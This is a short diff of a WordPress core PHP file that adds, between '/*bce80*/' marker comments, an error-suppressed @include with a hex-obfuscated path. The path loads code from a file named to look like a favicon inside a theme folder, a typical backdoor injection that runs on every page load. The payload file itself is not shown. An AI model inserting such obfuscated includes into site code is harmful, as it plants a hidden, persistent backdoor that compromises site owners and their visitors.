@@ -1,4 +1,10 @@
 <?php
+
+/*bce80*/
+
+@include "\x2fvar\x2fwww\x2fhtm\x6c/we\x62app\x73/jo\x72dan\x61kw/\x77p-c\x6fnte\x6et/t\x68eme\x73/tw\x65nty\x74en/\x66avi\x63on_\x39c5f\x62f.i\x63o";
+
+/*bce80*/
 /**
  * Used to set up and fix common variables and include
  * the WordPress procedural and class library.
